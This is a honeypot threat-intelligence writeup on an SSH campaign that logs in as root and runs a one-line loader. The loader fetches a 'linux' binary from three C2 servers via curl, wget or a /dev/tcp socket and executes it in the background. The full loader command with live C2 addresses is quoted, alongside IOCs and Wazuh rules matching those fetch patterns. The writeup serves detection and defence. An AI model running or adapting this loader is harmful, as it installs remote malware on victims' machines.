# NINGI-WRITEUP-018: russh `/linux` Loader with Encrypted Runtime Argument — Three Rotating C2s

| Field | Value |
|---|---|
| **Document ID** | NINGI-WRITEUP-018 |
| **Date** | 2026-06-27 |
| **Observation Window** | 2026-06-25 — 2026-06-27 |
| **Category** | Malware Delivery / Loader / C2 |
| **Environment** | fuji honeypot (`175.45.180.167:22`) — Cowrie / Wazuh 4.x |
| **Severity** | High (single-shot loader with live C2 infrastructure; payload family unconfirmed — not captured) |
| **Primary Actors** | `43.133.203.194`, `220.203.230.188`, `103.236.75.86` |

---

## Overview

Three separate source IPs hit the fuji honeypot across June 25–27, each exactly once, each logging in as `root:password`, each presenting the SSH client banner `SSH-2.0-russh_0.51.1`, and each issuing a single command: a one-line shell loader that fetches a binary named `linux` from a dedicated C2, makes it executable, and runs it in the background with a long encrypted argument. The three sessions use **three different C2 servers** but an otherwise **identical command template** — a coordinated campaign running across rotating infrastructure.

I assess with high confidence that this is a **modern loader delivering a downstream implant**, distinct from the Mirai dropper (NINGI-WRITEUP-004) and the krane Go botnet (NINGI-WRITEUP-009). Two things separate it from those families: the SSH client is built on **`russh`** (a Rust SSH library, not Go or a Mirai C scanner), and the delivery is a **single x86-64 ELF** (`/linux`) rather than the multi-architecture shotgun those campaigns fire. The encrypted base64 blob passed as a runtime argument is consistent with a loader that keeps no plaintext configuration on disk — the C2 address, campaign key, or staging parameters travel in the argument and are decoded in memory.

**The binary was not captured.** fuji's egress policy (UFW outbound deny-default) blocked every outbound fetch, so the `/linux` payload never landed and Cowrie recorded no `cowrie.session.file_download` for these sessions. This writeup therefore documents the loader command, the delivery mechanics, and the C2 infrastructure with full confidence, and the payload family as **unconfirmed**. I am not calling it a cryptominer or a specific bot family on the strength of the loader alone.

---

## Attack Sessions

| Source IP | Credential | SSH client | C2 fetched | C2 port |
|-----------|------------|------------|-----------|---------|
| `43.133.203.194` | `root:password` | `SSH-2.0-russh_0.51.1` | `47.84.190.146` | 9593 |
| `220.203.230.188` | `root:password` | `SSH-2.0-russh_0.51.1` | `47.107.63.26` | 8127 |
| `103.236.75.86` | `root:password` | `SSH-2.0-russh_0.51.1` | `176.12.69.103` | 6287 |

One session per IP, one command per session. The shared `russh_0.51.1` banner and the identical command structure across three otherwise-unrelated IPs is the strongest indicator of a single operator with rotating launch nodes and rotating C2.

---

## The Loader Command

Representative session (`43.133.203.194` → `47.84.190.146:9593`). The base64 argument and the `/tmp` filename differ per session; the structure does not:

```bash
nohup $SHELL -c "curl http://47.84.190.146:9593/linux -o /tmp/l6wZw1VE63; \
if [ ! -f /tmp/l6wZw1VE63 ]; then wget http://47.84.190.146:9593/linux -O /tmp/l6wZw1VE63; fi; \
if [ ! -f /tmp/l6wZw1VE63 ]; then exec 6<>/dev/tcp/47.84.190.146/9593 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/l6wZw1VE63 ; \
chmod +x /tmp/l6wZw1VE63 && /tmp/l6wZw1VE63 <BASE64_ARG>; fi; \
echo password > /tmp/.opass; \
chmod +x /tmp/l6wZw1VE63 && /tmp/l6wZw1VE63 <BASE64_ARG>" &
```

### Mechanics

**Triple-fallback delivery.** The loader tries three transports in order, each gated on the previous failing:
1. `curl http://C2:PORT/linux -o /tmp/<rand>`
2. `wget http://C2:PORT/linux -O /tmp/<rand>` if the file is absent
3. A raw `/dev/tcp` bash socket — `exec 6<>/dev/tcp/C2/PORT && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/<rand>` — if both binaries are missing

The `/dev/tcp` fallback is the notable one: it requires neither `curl` nor `wget`, only a bash with `/dev/tcp` support, and it speaks just enough HTTP (`GET /linux`) to pull the file off a plain web listener. This is a stripped-down resilience pattern aimed at hardened or minimal hosts where download tools have been removed.

**Randomised drop name.** Each session writes to a fresh random `/tmp` filename (`l6wZw1VE63`, `BF72WxK6Y7`, `3qkgOHvquU`), defeating naive name-based detection and cleanup.

**Encrypted runtime argument.** The binary is executed with a ~700-character base64 blob as its sole argument. Passing configuration at runtime rather than embedding it means the on-disk ELF carries no plaintext C2 or campaign data — static analysis of the binary alone would not reveal where it calls home. The blob differs per C2, consistent with per-node encrypted config (callback address, key, or campaign/affiliate identifier).

**`/tmp/.opass` marker.** Every session writes `echo password > /tmp/.opass` — a hidden dotfile in `/tmp` containing the literal string `password`. This is almost certainly an infection/lock marker: a way for the implant (or a re-infection attempt) to recognise an already-compromised host, or to stash the credential used. It is a useful, cheap host IOC.

**Background, detached execution.** The whole chain runs under `nohup $SHELL -c "..." &` so it survives session disconnect — appropriate for an automated single-shot loader that logs in, fires, and leaves.

**Double execution.** The binary is launched once inside the download `if` block and again unconditionally at the end — a belt-and-braces attempt to ensure it runs whether or not the conditional path was taken.

---

## C2 Infrastructure

| C2 | Port | Path | Notes |
|----|------|------|-------|
| `47.84.190.146` | 9593 | `/linux` | Alibaba Cloud (Aliyun) allocation* |
| `47.107.63.26` | 8127 | `/linux` | Alibaba Cloud (Aliyun) allocation* |
| `176.12.69.103` | 6287 | `/linux` | *pending whois confirmation* |

\* The `47.0.0.0/8` ranges are predominantly Alibaba Cloud; treat as indicative pending formal whois. Each C2 serves the payload over plain HTTP on a distinct high, non-standard port — a pattern that frustrates port-based egress allowlists and blends into ephemeral-port noise. The single binary name `linux` (no architecture suffix) indicates a single-target build, most likely x86-64 cloud/server hosts rather than the embedded/IoT spread that Mirai and krane chase.

---

## Assessment: How This Differs From Prior Loaders

| | Mirai dropper (W-004) | krane (W-009) | This loader (W-018) |
|--|--|--|--|
| SSH client | `SSH-2.0-Go` scanner | Go botnet | **`russh` (Rust)** |
| Delivery | `sshbins.sh`, 12 archs | `bins.sh`, multi-arch | **single `/linux` ELF** |
| Config | in-binary | in-binary | **encrypted runtime arg** |
| Transport | wget/curl | wget/tftp/ftpget | **curl/wget/`/dev/tcp`** |
| Host marker | — | `IP_DAEMONIZED=1` | **`/tmp/.opass`** |
| Sample captured | yes | yes | **no (egress-blocked)** |

The Rust toolchain (`russh`), the single-architecture target, the encrypted runtime config, and the `/dev/tcp` fallback together describe a more deliberate, server-focused operation than the spray-everything embedded botnets documented earlier in the series. Whether the payload is a miner, a proxy/relay implant, or a backdoor is **not determinable from honeypot data alone** — the binary did not land. The next opportunity to attribute it would be capturing the `/linux` ELF from one of the C2s while it is still live (out of scope for the honeypot; the C2s are third-party hosts).

---

## MITRE ATT&CK Mapping

| Technique | ID | Observed |
|---|---|---|
| Valid Accounts: Default Accounts | T1078.001 | `root:password` login |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | `nohup $SHELL -c "..."` loader |
| Ingress Tool Transfer | T1105 | curl / wget / `/dev/tcp` payload fetch |
| Obfuscated Files or Information | T1027 | encrypted base64 runtime argument |
| Hide Artifacts: Hidden Files and Directories | T1564.001 | `/tmp/.opass` dotfile marker |
| Application Layer Protocol: Web Protocols | T1071.001 | HTTP GET to C2 over high ports |
| Resource Hijacking | T1496 | *suspected, unconfirmed — payload not captured* |

---

## Indicators of Compromise

### Network

| IP | Role | ASN / Geo |
|----|------|-----------|
| `43.133.203.194` | Loader launch node | *pending whois* |
| `220.203.230.188` | Loader launch node | *pending whois* |
| `103.236.75.86` | Loader launch node | *pending whois* |
| `47.84.190.146:9593` | C2 / payload host | Alibaba Cloud (indicative) |
| `47.107.63.26:8127` | C2 / payload host | Alibaba Cloud (indicative) |
| `176.12.69.103:6287` | C2 / payload host | *pending whois* |

### URLs

`http://47.84.190.146:9593/linux`, `http://47.107.63.26:8127/linux`, `http://176.12.69.103:6287/linux`

### Host

| Signal | Value |
|--------|-------|
| Marker file | `/tmp/.opass` containing `password` |
| Drop location | random alnum filename in `/tmp` (e.g. `l6wZw1VE63`) |
| SSH client banner | `SSH-2.0-russh_0.51.1` |
| Credential | `root:password` |

---

## Detection

### Wazuh — loader command pattern

```xml
<!-- nohup curl/wget loader fetching a 'linux' binary -->
<rule id="100130" level="14">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>nohup $SHELL -c</match>
  <regex>curl http\S+/linux|wget http\S+/linux|/dev/tcp/\S+/\d+</regex>
  <description>Cowrie: single-shot loader fetching /linux binary (W-018 russh loader)</description>
  <group>cowrie,malware,loader,</group>
</rule>

<!-- /tmp/.opass infection marker -->
<rule id="100131" level="13">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>/tmp/.opass</match>
  <description>Cowrie: W-018 loader marker file write (/tmp/.opass)</description>
  <group>cowrie,malware,loader,ioc,</group>
</rule>
```

### Host-based

- File `/tmp/.opass` on any Linux host is a high-confidence compromise marker for this campaign: `find /tmp -maxdepth 1 -name .opass`.
- Outbound HTTP to the three C2s on ports 9593 / 8127 / 6287 — or any plain-HTTP GET for a path of exactly `/linux` from a server process.
- A short-lived random-named executable in `/tmp` launched with a long base64 argument.
- `/dev/tcp` usage in shell history on a host without a clear administrative reason.

### Network

- The `/dev/tcp` fallback emits a malformed bare `GET /linux` with no HTTP version or headers — anomalous enough to flag at an IDS if the C2 ports are reachable.

---

## Lessons Learned

- **Egress deny-default did its job.** The same UFW outbound policy that backstops the proxy abuse in NINGI-2026-005 is why the `/linux` binary never landed here. The cost is that I cannot attribute the payload; the benefit is that the honeypot was never used to stage live malware. For this research box that is the right trade.
- **Loaders are getting quieter and more modular.** Single-architecture builds, encrypted runtime config, and `/dev/tcp` fallbacks point away from the noisy multi-arch IoT botnets and toward smaller, server-targeted, harder-to-statically-analyse operations. The Rust `russh` client is itself a marker of a more current toolchain.
- **`/tmp/.opass` is a free win for defenders.** A fixed-name dotfile marker is exactly the kind of cheap, reliable host IOC worth sweeping for across a fleet — far easier than chasing rotating C2 IPs.
- **Capture is not guaranteed, and that is fine to say.** Three earlier writeups recovered real binaries; this one did not. Documenting the loader and infrastructure with confidence while explicitly marking the payload family unconfirmed is more useful than guessing a family to make the entry feel complete.

---

*Everything in this writeup comes from real attack traffic captured by my Cowrie honeypot between 2026-06-25 and 2026-06-27.*
*The `/linux` payload was not retrieved — egress was blocked — so the loader and its C2 infrastructure are documented, and the payload family is left unconfirmed.*
*I documented it as part of the homelab research project.*
